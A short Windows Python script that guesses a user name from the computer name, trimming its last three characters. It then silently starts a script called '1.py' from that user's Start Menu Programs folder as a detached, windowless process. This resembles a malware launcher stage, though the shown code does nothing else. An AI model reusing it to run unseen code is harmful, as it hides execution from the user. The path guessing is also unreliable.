import subprocess
import sys
import os 
DETACHED_PROCESS = 0x00000008
a=os.environ['COMPUTERNAME']
eo=len(a)
eo=eo-3
pid = subprocess.Popen([sys.executable, "C:\\Users\\"+str(a[:eo])+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\1.py"],
                       creationflags=DETACHED_PROCESS).pid
